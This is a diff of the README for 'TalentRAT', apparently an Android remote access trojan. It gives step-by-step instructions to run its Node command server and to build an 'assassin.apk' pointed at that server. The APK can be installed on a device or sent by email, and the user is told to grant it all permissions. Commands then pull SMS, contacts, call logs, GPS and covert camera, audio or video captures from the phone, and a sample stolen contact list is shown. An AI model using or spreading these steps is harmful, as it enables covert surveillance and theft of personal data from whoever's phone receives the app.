@@ -28,52 +28,7 @@
 - node.js
 - npm
 # Usage
-#### 1.Start up The Server
 ```
-1. git clone git@github.com:honglvt/TalentRAT.git / or https
-2. cd the project path
-3. cd Server
-4. npm install
-5. npm start
-```
-now you can see the terminal show ASSASSIN
-----
-#### 2.Build the Android apk 
-1. confrim that you have prepare the env for building the app
-2. connect the android device  to ur PC
-3. enable the develop mode on ur android device
-4. edit the socket address with</br>
-```
-use ifconfig to get server IP Address
-cd project
-vim ./gradle.properties
-edit the SERVER_ADDRESS that you got befroe
-```
-5. on some rom you should also  enable the adb to install the apk
-6. if you are not a developer you can install the apk yourself
-- post the .apk to your device such as email or other way
-- then install the .apk on folder
-----
-#### 3.Intasll apk 
-```
-1. cd the project path 
-2. ./assembleApk.sh debug    you can choose the arg debug/release
-3. ./installNewestApk.sh 
-4. open the apk on ur device
-5. the most important is that  you should grant all of the permissions on the device
-```
-# Instruction to client
-```
-1. cd /Server
-2. which node
-3. vim ./assassin.js  replace #! /usr/local/bin/node with your own position
-4. chmod 777 ./assassin.js
-5. ./assassin.js -h
-```
-```
-$ ./assassin.js -h                                                 ‹ruby-2.6.0›
-Usage: assassin [options]
-
 Options:
   -V, --version             output the version number
   -a,--assassin <assassin>  select a command post to the clients if you choose the shadow you should input the cmd -t to choose a type between pic/audio/video [sms,contacts,call,gps,shadow] (default: "sms")
@@ -84,6 +39,55 @@ Options:
   -c,--client <client>      select a client to post the command
   -l,--lens <lens>          which camera lens that you want to open [0,1]
   -h, --help                output usage information
+```
+### *Step.1 clone/download the project  and start up the server*
+```
+1. git clone git@github.com:honglvt/TalentRAT.git / or download the project yourself on the github
+2. cd the project path such as: ~/AndroidProject/ProjectPath/Server/
+3. cd Server 
+4. npm install
+5. npm start
+now you can see the terminal console "ASSASSIN"
+```
+### *Step.2 build assasin.apk with shell at project folder*
+befor build the apk
+- confrim that you have prepare the env for building the app
+- connect the android device  to ur PC
+- enable the develop mode on ur android device 
+if you can not do *step.2* and *step.3*  you can build the *assassin.apk* and install it to your device manually 
+now let's start assembleApk
+```
+at the first time when you download the project you should confirm your OS type mac or linux, 
+and get your server IPAdress by "ifconfig/ipconfig" 
+0.  chmod 777 ./assembleApk.sh
+    chmod 777 ./installNewestApk.sh
+1.  execute the assemble shell  "./assaembleApk.sh OS serverIP"        
+    serverIP type as 127.0.0.1:3000   
+    OS type as mac or linux
+    as follows:
+    "./assembleApk.sh mac 127.0.0.1:3000"
+    "./assembleApk.sh linux localHost:3000"
+2.  ./installNewestApk.sh
+    if you are not able to connect the device to your PC, send the apk by email or xx and install it manually
+3.  look at your device, the apk has been installed into your device
+    run it 
+    grant all of permissions 
+    and now you can see { a user connected info }at terminal you have opened at Step.1
+```
+### *Step.3 execute command，then you will get whaterver you want!!!*
+| cmd        |  ./assassin.js -a sms -c 9910294050493  |
+| ---------- | :-----------:  |
+| description| select the command between [sms,contacts,call,gps,shadow]  if you choose the shadow you should also use -t to choose a type between pic/audio/video     |
+***args with -c can be gotten at server terminal {a user connected info}***
+***type the cmd into a new terminal at ~/project/Server***
+and the result:
+```
+{
+    "command": "send_contacts_list",
+    "IMEI": "99001249798100"
+}
+response is : 
+[{name:ASX,phoneNum:2345 67}]
 ```
 ### exemples
 | cmd        | -a     |
